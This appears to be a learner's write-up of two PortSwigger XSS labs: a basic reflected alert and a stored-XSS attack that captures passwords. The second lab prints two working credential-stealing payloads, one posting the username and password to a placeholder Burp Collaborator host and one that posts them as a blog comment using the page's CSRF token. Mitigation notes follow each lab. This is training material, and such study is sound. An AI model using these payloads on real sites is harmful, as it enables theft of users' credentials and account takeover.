# XSS Labs — PortSwigger Web Security Academy

**Topic:** Cross Site Scripting (XSS)
**Platform:** PortSwigger Web Security Academy
**Goal:** Practice and understand XSS vulnerabilities hands-on

---

## Lab 1 — Reflected XSS (Basic)

- **Lab Link:** https://portswigger.net/web-security/cross-site-scripting/reflected/lab-html-context-nothing-encoded
- **Difficulty:** Apprentice
- **Vuln Type:** Reflected XSS
- **Location:** Search parameter (GET request)
- **Tool Used:** Browser

### Steps
1. Opened the lab and went to the search box
2. Identified search parameter as injection point
3. Injected XSS payload directly into search field
4. Browser executed the JavaScript and alert popup appeared
5. Lab solved successfully

- **Payload Used:** <script>alert("BAKI");</script>
- **What happened:** JavaScript executed in browser — alert box popped up
- **Why it worked:** Search input was reflected directly in response without any sanitization
- **Mitigation:** Sanitize and encode user input, use Content Security Policy (CSP)


<img width="1824" height="986" alt="xss lab1 1" src="https://github.com/user-attachments/assets/7ae00a01-5255-47f0-94db-a343fe13ad9d" />

---

## Lab 2 — Stored XSS (Capture Passwords)

- **Lab Link:** https://portswigger.net/web-security/cross-site-scripting/exploiting/lab-capturing-passwords
- **Difficulty:** Practitioner
- **Vuln Type:** Stored XSS
- **Location:** Blog comment section
- **Tool Used:** Browser (Alternative method — no Burp Professional required)

### Official Payload (Requires Burp Collaborator — Burp Professional only)
<input name=username id=username>
<input type=password name=password onchange="if(this.value.length)fetch('https://BURP-COLLABORATOR-SUBDOMAIN',{
method:'POST', mode: 'no-cors', body:username.value+':'+this.value });">

### My Custom Crafted Payload (Without Burp Professional)
<input type="text" name="username">
<input type="password" name="password" onchange="hax()">
<script>
function hax() {
    var token = document.getElementsByName('csrf')[0].value;
    var username = document.getElementsByName('username')[0].value;
    var password = document.getElementsByName('password')[0].value;
    var data = new FormData();
    data.append('csrf', token);
    data.append('postId', 3);
    data.append('comment', `${username}:${password}`);
    data.append('name', 'victim');
    data.append('email', 'baki@hanma');
    data.append('website', 'http://www.baki.hanma');
    fetch('/post/comment', {
        method: 'POST',
        mode: 'no-cors',
        body: data
    });
}
</script>

### Steps
1. Opened a blog post and identified comment section as injection point
2. Official method requires Burp Collaborator (Burp Professional only)
3. Crafted a custom alternative payload with fake username/password fields
4. Added JavaScript function hax() to trigger on password change
5. Function captured credentials using getElementsByName
6. Sent captured credentials as a new comment via fetch POST request
7. Victim visited the page and typed credentials — hax() triggered
8. Credentials appeared in comments: administrator:pl8bc0ge8jn5c86db44t
9. Logged in as administrator — lab solved

- **What happened:** Victim credentials captured and stored as blog comment
- **Why it worked:** Comment input stored and reflected to all users without sanitization
- **Mitigation:** Sanitize all user input, implement strict Content Security Policy (CSP)


 <img width="1896" height="1026" alt="lab2xss1" src="https://github.com/user-attachments/assets/3504fcf8-da82-4c22-b827-4341c6138639" />
<img width="1129" height="434" alt="lab2xss2" src="https://github.com/user-attachments/assets/e3cf5261-4ae2-4eb0-8b40-0cea5ddde5af" />
<img width="1730" height="917" alt="lab2xss3" src="https://github.com/user-attachments/assets/ba58e7a5-23fd-419b-bd59-fd861e064a35" />


